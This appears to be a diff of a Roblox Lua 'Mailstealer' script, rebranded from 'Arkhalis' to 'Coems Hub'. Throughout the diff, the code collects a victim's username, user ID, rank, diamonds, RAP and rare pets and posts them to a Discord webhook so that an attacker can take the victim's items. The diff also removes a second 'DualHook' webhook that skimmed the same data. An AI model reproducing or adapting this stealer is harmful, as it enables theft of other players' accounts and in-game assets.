@@ -35,7 +35,7 @@ elseif game.PlaceId == 11725212117 then
 else
 	_G.GameIn = "❓ Couldn't find game"
 end
-local webhookcolor = "13369599"
+local webhookcolor = "5763719"
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
@@ -47,40 +47,40 @@ _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))
 local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
-local function sendwebhookDualHook(msgpremium)
+local function sendwebhook(msg)
 local msg = {
-	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-	["content"]= "**🎁New Hit With Arkhalis🎁** || @here|| ",
-	["username"] = "Arkhalis",
+	["avatar_url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png",
+	["content"]= "**:money_mouth: New Hit With Coems:money_mouth:** || @here|| ",
+	["username"] = "Coems Hub",
 	["embeds"]= {
 	  {
-		["title"]= "`Arkhalis Mailstealer Results`",
-		["description"]= "**Data from the victim**\n```🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n☠Executor: "..exploit.."\n📮Receiver: ".._G.Username.."```",
-		["url"]= "https://discord.gg/ajmeAeq76d",
+		["title"]= "`Coems Hub Mailstealer Results`",
+		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n<:synapse:1124755689798107266> Executor: "..exploit.."***",
+		["url"]= "https://discord.gg/scriptz",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
-        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
+        ["url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png",
         ["height"] = 420,
         ["width"] = 420
         },
 		["fields"]= {
         {
-          ["name"]= "**💎Diamonds 💎**",
+          ["name"]= "**<:diamond_psx:1118474311615918080>Diamonds<:diamond_psx:1118474311615918080>**",
           ["value"]= "```"..GemsFormated.."```",
           ["inline"]= true
         },
         {
-          ["name"]= "**⬆️Rap⬆️**",
+          ["name"]= "**<:arrowup:1112767464640622686>RAP<:arrowup:1112767464640622686>**",
           ["value"]= "```"..RapFormated.."```",
           ["inline"]= true
         },
 	{
-          ["name"]= "**🏆Exclusive🏆**",
+          ["name"]= "**<:huge_cat:1118474511763906660>Exclusive<:huge_cat:1118474511763906660>**",
           ["value"]= "```"..Exclusive.."```",
           ["inline"]= true
         },
 	{
-          ["name"]= "**🎃Exclusive🎃**",
+          ["name"]= "**<:event:1112767158049591307>Event<:event:1112767158049591307>**",
           ["value"]= "```"..Event.."```",
           ["inline"]= true
         }
@@ -90,8 +90,8 @@ local msg = {
   },
 	["attachments"] = {}
   }
-  local Webhook = _G.WebhookDualHook
+  local Webhook = _G.Webhook
   request = http_request or request or HttpPost or syn.request
   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
   end
-sendwebhookDualHook(msgpremium)
+  sendwebhook(msg)
